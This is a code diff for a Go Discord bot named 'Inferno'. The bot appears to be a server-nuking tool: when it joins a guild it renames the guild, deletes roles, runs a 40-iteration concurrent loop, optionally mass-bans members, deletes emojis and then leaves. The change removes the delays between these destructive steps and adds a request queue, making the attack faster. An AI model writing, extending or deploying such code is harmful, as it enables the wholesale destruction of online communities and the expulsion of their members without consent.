@@ -3,23 +3,34 @@ package main
 import (
 	"Inferno/core/creating"
 	"Inferno/core/removing"
+	"Inferno/core/requests"
 	"Inferno/core/start_end"
 	"fmt"
 	"os"
 	"strconv"
 	"sync"
-	"time"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/joho/godotenv"
 )
 
+var (
+	queue = make(chan string, 100)
+	mutex = &sync.Mutex{}
+)
+
 func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
 	var wg sync.WaitGroup
+
+	queue <- event.ID
+	requests.HandleQueue(s)
 
 	godotenv.Load()
 	MASS_BAN := os.Getenv("MASS_BAN")
 	MASSBAN, _ := strconv.ParseBool(MASS_BAN)
+
+	mutex.Lock()
+	defer mutex.Unlock()
 
 	start_end.Logs(s, event)
 	creating.GuildRename(s, event)
@@ -43,16 +54,12 @@ func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
 	}
 	wg.Wait()
 
-	time.Sleep(2 * time.Second)
-
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
 		creating.DeleteRoles(s, event)
 	}()
 	wg.Wait()
-
-	time.Sleep(2 * time.Second)
 
 	for i := 0; i < 40; i++ {
 		wg.Add(1)
@@ -62,8 +69,6 @@ func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
 		}()
 	}
 	wg.Wait()
-
-	time.Sleep(2 * time.Second)
 
 	if MASSBAN {
 		wg.Add(1)
@@ -76,9 +81,7 @@ func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
 		fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
 	}
 
-	time.Sleep(2 * time.Second)
-
 	removing.EmojiDelete(s, event)
 
-	start_end.BotLeave(s, event)
+	start_end.Leave(s, event)
 }
